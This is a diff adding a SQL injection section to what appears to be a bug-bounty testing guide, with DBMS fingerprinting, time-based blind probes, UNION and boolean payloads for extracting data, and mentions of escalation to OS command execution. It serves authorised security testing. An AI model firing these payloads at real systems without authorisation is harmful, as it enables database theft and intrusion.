@@ -761,6 +761,39 @@ SeLeCt * FrOm uSeRs
 ' OR '1'='1
 ```
 
+### Stack → DBMS fingerprint (pick the right payload or you MISS blind/error injections)
+| Tech signal | Likely DBMS | Blind probe |
+|---|---|---|
+| `.asp`/`.aspx`, IIS, ASP.NET error pages | MSSQL | `WAITFOR DELAY '0:0:5'--` |
+| `.php`, Apache/nginx LAMP | MySQL/MariaDB | `SLEEP(5)--` |
+| Java/Spring, `.jsp` | PostgreSQL / MSSQL / Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message('a',5)` |
+| Python (Django/Flask), Rails | PostgreSQL / MySQL | `pg_sleep(5)` / `SLEEP(5)` |
+
+Fingerprint early: `@@version` (MSSQL/MySQL), `version()` (PG), `SELECT banner FROM v$version` (Oracle). A wrong-DBMS payload silently fails — that's a missed bug, not a clean target.
+
+### Where SQLi hides (test every sink, not just the search box)
+- [ ] Every param from recon / `param-discover` — incl. JSON keys, `ORDER BY`/`sort=` columns (can't be parameterized → high-yield), `LIMIT`/`offset`
+- [ ] Headers & cookies looked up in a query (`X-Forwarded-For`, `User-Agent`, session/auth tokens)
+- [ ] Second-order: value stored on one request (profile field, filename), fires in a *later* query — plant `'`/sleep, then watch a different page render
+- [ ] REST/GraphQL filters, export & report generators, autocomplete/"search" endpoints
+
+### Confirm + prove impact (read-only — kills N/A, catches blind)
+```sql
+-- 1. confirm it's REAL (don't stop at one error)
+' AND 1=1--  vs  ' AND 1=2--    → responses differ = boolean oracle = real
+-- 2. column count, then a displayable column
+' ORDER BY 1--  ↑ N until error → N-1 cols
+0' UNION SELECT NULL,'MARKER',NULL--   → find where MARKER renders
+-- 3. prove readable data (ONE value is enough for a valid report)
+0' UNION SELECT NULL,@@version,NULL--               -- MSSQL/MySQL
+0' UNION SELECT NULL,version(),NULL--               -- PostgreSQL
+-- one-request dump when proving a sensitive table:
+-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()
+```
+SQLi that reads a sensitive row (e.g. a config/credentials table) **is already a valid, high-severity finding** — submit on the readable data, not a lone 500. You do not need RCE.
+
+> **Escalation (conditional — most SQLi stops at data read).** Only if the DB account is `sysadmin`/superuser **and** host exploitation is in program scope does SQLi → OS RCE apply (MSSQL `xp_cmdshell`, PG `COPY…FROM PROGRAM`, MySQL `INTO OUTFILE`). In BBP this is usually out of scope — prove the data read, note escalation potential in Impact, and don't run it.
+
 ## GraphQL
 
 ### Introspection (alone = Informational, but reveals attack surface)
